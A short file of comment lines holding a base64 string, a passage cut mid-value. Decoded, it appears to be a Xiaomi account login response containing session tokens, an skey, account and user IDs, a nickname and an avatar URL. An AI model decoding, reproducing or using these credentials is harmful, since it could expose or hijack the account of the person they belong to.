# a1JWOTNFIiwgInQiOiAiXzAxMDRfTHZGdk10dzVraHIvd1ByVVZUK0RiNkpnMjBaTWdzUHZHdGtEeVha
# cVZWNXc3UGhhdlprR1VxOHhlNzR2bGRaMSJ9LCAib2F1dGgiOiB7ImNvZGUiOiAwLCAiaGVhZGltZ3Vy
# bCI6ICJodHRwczovL3BpYy5rdHMuZy5taS5jb20vMTQ1MDI1Njc4N18xNzQ4NDExMDE3NzczIiwgIm1p
# ZCI6ICIyNjgxNzE4Mjc3IiwgIm1zZyI6ICIiLCAibmVlZEJpbmRNaWQiOiBmYWxzZSwgIm5pY2tuYW1l
# IjogIui1q+acrOeahOeGiiIsICJwdCI6ICJfMDEwNF9MdkZ2TXR3NWtoci93UHJVVlQrRGI2SmcyMFpN
# Z3NQdkd0a0R5WFpxVlY1dzdQaGF2WmtHVXE4eGU3NHZsZFoxIiwgInNleCI6IDIsICJza2V5IjogIkFD
# bEJmNlZtZXozNkk5dEYiLCAic3QiOiAiXzAxMDRfTHZGdk10dzVraHIvd1ByVVZUK0RiNkpnMjBaTWdz
# UHZHdGtEeVhacVZWNXc3UGhhdlprR1VxOHhlNzR2bGRaMSIsICJ1dWlkIjogIjE0NTAyNTY3ODcifSwg
# Im9rIjogdHJ1ZSwgImNvZGUiOiAi5bCP57GzIn19XQ==
